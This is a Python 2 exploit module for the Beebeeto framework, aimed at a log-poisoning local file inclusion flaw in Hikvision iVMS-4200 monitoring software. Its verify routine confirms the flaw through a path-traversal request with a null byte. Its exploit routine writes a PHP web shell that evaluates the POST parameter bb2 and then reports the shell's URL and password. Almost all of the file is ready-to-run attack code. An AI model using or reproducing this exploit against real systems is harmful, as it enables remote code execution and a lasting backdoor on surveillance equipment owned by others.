#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0156',
            'name': 'Hikvision /Server/logs/error.log 文件包含导致GETSHELL漏洞 POC & Exploit',
            'author': 'foundu',
            'create_date': '2014-11-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Hikvision',
            'vul_version': ['iVMS-4200'],
            'type': 'Local File Inclusion',
            'tag': ['海康威视漏洞', '文件包含漏洞', 'php'],
            'desc': '海康威视IVMS系列的监控客户端，不过大部分在内网。',
            'references': ['http://wooyun.org/bugs/wooyun-2010-072453',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/<?echo(md5(bb2))?>'
        test_url = args['options']['target'] + '/index.php?controller=../../../../Server/logs/error.log%00.php'
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        try:
            urllib2.urlopen(verify_url)
        except urllib2.HTTPError, e:
            if e.code == 500:
                content = urllib2.urlopen(test_url).read()
                if '0c72305dbeb0ed430b79ec9fc5fe8505' in content:
                    args['success'] = True
                    args['poc_ret']['vul_url_1'] = verify_url
                    args['poc_ret']['vul_url_2'] = test_url
        return args

    @classmethod
    def exploit(cls, args):
        verify_url = args['options']['target'] + '/<?echo(md5(bb2));eval($_POST[bb2])?>'
        test_url = args['options']['target'] + '/index.php?controller=../../../../Server/logs/error.log%00.php'
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        try:
            urllib2.urlopen(verify_url)
        except urllib2.HTTPError, e:
            if e.code == 500:
                content = urllib2.urlopen(test_url).read()
                if '0c72305dbeb0ed430b79ec9fc5fe8505' in content:
                    args['success'] = True
                    args['poc_ret']['webshell'] = test_url
                    args['poc_ret']['password'] = 'bb2'
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())